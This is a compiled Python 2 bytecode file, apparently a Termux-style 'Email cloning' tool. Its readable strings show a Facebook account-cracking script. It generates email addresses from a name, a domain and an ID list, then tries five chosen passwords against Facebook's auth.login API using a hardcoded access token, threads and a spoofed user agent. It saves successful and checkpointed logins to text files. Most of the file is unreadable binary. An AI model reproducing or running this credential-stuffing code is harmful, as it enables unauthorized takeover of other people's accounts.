�
d�d_c           @   s�  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z e  j d � xJ e
 d � D]< Z e j d d � Z e d d � e _ e GHe j j �  q� Wy d  d l Z Wn e k
 re  j d � n Xy d  d l Z Wn8 e k
 ree  j d	 � e j d � e  j d
 � n Xd  d l Z d  d l Z d  d l Z d  d l  Z  d  d l Z d  d l Z d  d l m Z d  d l m Z d  d
 l m Z e e � e j d � e j �  Z  e  j! e" � e  j# e j$ j% �  d d �d% g e  _& d& g e  _& d �  Z' d �  Z( d �  Z) d �  Z* d Z+ d Z, d Z- d Z. d Z/ d Z0 d Z1 d Z2 d  �  Z3 d! Z4 g  Z5 g  Z6 g  a7 g  Z8 g  a9 g  Z: g  Z; d" �  Z< d# �  Z= e> d$ k r�e< �  n  d S('   i����Ns   rm -rf .txti�  i   i'  s   .txtt   as   pip2 install requestss   pip2 install mechanizes   python2 Emailcloning.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c           C   s   d GHt  j j �  d  S(   Ns   God by Frends (   t   ost   syst   exit(    (    (    s   /sdcard/fbmail.pyt   keluar%   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t | � d � | 7} q Wt | � S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   /sdcard/fbmail.pyt   acak*   s
    
0c         C   s~   d } xA | D]9 } | j  | � } | j d | d t d | � � } q
 W| d 7} | j d d � } t j j | d � d  S(   NR
   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR
   (    (    s   /sdcard/fbmail.pyR   3   s    
(
c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g����MbP?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/fbmail.pyt   jalan>   s    
s   [1;94ms   [1;91ms   [1;92ms   [1;97ms   [1;96ms   [1;95ms   [1;93ms�  
[1;91m                           :::!~!!!!!:.
[1;96m                  .xUHWH!! !!?M88WHX:.
[1;94m                .X*#M@$!!  !X!M$$$$$$WWx:.
[1;91m               :!!!!!!?H! :!$!$$$$$$$$$$8X:
[1;96m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
[1;96m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
[1;94m             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
[1;96m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
[1;94m               ~?WuxiW*`   `"#$$$$8!!!!??!!!
[1;91m             :X- M$$$$       `"T#$T~!8$WUXU~
[1;96m            :%`  ~#$$$m:        ~!~ ?$$$$$$
[1;94m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
[1;91m.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
[1;94mW$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
[1;91m#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
[1;96m:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
[1;94m.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
[1;91mWi.~!X$?!-~    : ?$$$B$Wu("**$RM!
[1;96m$R@i.~~ !     :   ~$$$$$B$$en:``
[1;94m?MXT@Wx.~    :     ~"##*$$$$M~
                                c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q Wd  S(   Ns   ▇   s   ▇▇  s
   ▇▇▇ s   
[1;91mPlease Wait... [1;93mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/fbmail.pyt   tikd   s
    

i    c           C   s]   t  j d � t GHd GHt j d � d GHd GHt j d � d GHt j d � d GHt �  d  S(   Nt   clears8   [1;97m «--------------------------------------------»g����Mb@?s&   [1;93m[1][1;94m Start Email  Clonings"   [1;93m[0][1;91m Back            (   R   t   systemt   logoR   R   t   mafia(    (    (    s   /sdcard/fbmail.pyt   blackmafiayu   s    



c             sR  t  d � }  |  d k r' d GHt �  n� |  d k r� d GHt j d � t GHyZ t  d � � d GHt  d � � d	 } x0 t | d
 � j �  D] } t j | j	 �  � q� WWq� t
 k
 r� d GHt  d � t �  q� Xn" |  d
 k r� t �  n d GHt �  d GHt  d � �  t j
 d � t  d � � t j
 d � t  d � � t j
 d � t  d � � t j
 d � t  d � � d GHt t t � � } t d | � t j
 d � d GHt j
 d � d GHt j
 d � d GH�  � � � � � � f d �  } t d � } | j | t � d GHd GHd t t t � � d t t t � � GHd GHt  d � d GHt �  d  S(   Ns!   
[1;93mChoose an Option  [1;95mR   s   [▇] Fill in correctlyt   1s8   [1;97m «--------------------------------------------»R&   s*   [1;91m Type Any Name (aliraza) > [1;97m s+   [1;95m Type Domain (@gmail.com) >[1;97m  s   .txtt   rs   [▇] File Not Founds	   
[ Back ]t   0s   [!] Fill in correctlys    [1;93m Type Any Pasword No1 .  g����Mb@?s    [1;93m Type Any Pasword No2 .  s!   [1;93m Type Any Pasword No3 .   s    [1;93m Type Any Pasword No4 .  s    [1;93m Type Any Pasword No5 .  s    [1;93mTotal Numbers: s1    [1;91mPlz Wait Cloned Accounts Will Appear Heres/    [1;92mTo Stop Process Press CTRL Then Press zc            s�  |  } y t  j d � Wn t k
 r* n Xy�� } t j d � | � d | d � } t j | � } d | k r� d � | � d | d d GHt d	 d
 � } | j � | � d | d � | j �  t	 j
 � | � | � n�d | d
 k rpd � | � d | d GHt d d
 � } | j � | � d | d � | j �  t j
 � | � | � nJ�  } t j d � | � d | d � } t j | � } d | k r/d � | � d | d d GHt d	 d
 � } | j � | � d | d � | j �  t	 j
 � | � | � n�d | d
 k r�d � | � d | d GHt d d
 � } | j � | � d | d � | j �  t j
 � | � | � n� } t j d � | � d | d � } t j | � } d | k rqd � | � d | d d GHt d	 d
 � } | j � | � d | d � | j �  t	 j
 � | � | � nId | d
 k r�d � | � d | d GHt d d
 � } | j � | � d | d � | j �  t j
 � | � | � n�� }	 t j d � | � d |	 d � } t j | � } d | k r�d � | � d |	 d d GHt d	 d
 � } | j � | � d |	 d � | j �  t	 j
 � | � |	 � nd | d
 k r6d � | � d |	 d GHt d d
 � } | j � | � d |	 d � | j �  t j
 � | � |	 � n�� }
 t j d � | � d |
 d � } t j | � } d | k r�d � | � d |
 d d GHt d	 d
 � } | j � | � d |
 d � | j �  t	 j
 � | � |
 � n�d | d
 k rxd � | � d |
 d GHt d d
 � } | j � | � d |	 d � | j �  t j
 � | � |
 � nB� } t j d � | � d | d � } t j | � } d | k r7d � | � d | d d GHt d	 d
 � } | j � | � d |
 d � | j �  t	 j
 � | � | � n� d | d
 k r�d � | � d | d GHt d d
 � } | j � | � d |	 d � | j �  t j
 � | � | � n  Wn n Xd  S(   Nt   saves�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt   access_tokens   [1;92m[Abm_OK]  s    ▇ s   
s   save/successfull.txtR    s   -•◈•-s   www.facebook.comt	   error_msgs   [1;93m[Abm_CP] s    -⋄- s   save/checkpoint.txts   [1;92m[Abm_OK][1;93m  s   [1;93m[Abm_CP][1;93m (   R   t   mkdirt   OSErrort   brt   opent   jsont   loadR   t   closet   okst   appendt   cpb(   t   argt   ct   pass1t   datat   qt   okbt   cpst   pass2t   pass3t   pass4t   pass5t   pass6(   t   blackat   blackbt   blackct   blackdt   blacket   kt   user(    s   /sdcard/fbmail.pyt   main�   s�    
'!!
!
'!!
!
'!!
!
'!!
!
'!!
!
'!!
!
 i   s'   [1;93m Process Has Been Completed ....s$    [1;92mTotal OK/[1;93mCP :[1;91m t   /s-    CP File Has Been Saved : save/checkpoint.txts   
[1;95m[[1;91mBack[1;95m](   t	   raw_inputR)   R   R'   R(   R4   t	   readlinest   idR9   t   stript   IOErrorR*   R   R   R   R   R"   R   t   mapR8   R:   (   t   lovehackerxt   idlistt   linet   xxxRN   t   p(    (   RG   RH   RI   RJ   RK   RL   RM   s   /sdcard/fbmail.pyR)   �   sh    











!j)
t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](?   R   R   R   t   datetimeR   t   hashlibt   ret	   threadingR5   t   urllibt	   cookielibt   getpassR'   t   ranget   nR   t   blackR4   R   R   t   requestst   ImportErrort	   mechanizeR   t   bs4t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR3   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR	   R   R   R"   t   Bt   Rt   Gt   Wt   St   Pt   YR(   R%   t   backt   berhasilt   cekpointR8   RR   R:   RA   t   cbR*   R)   t   __name__(    (    (    s   /sdcard/fbmail.pyt   <module>   sj   �




0


								�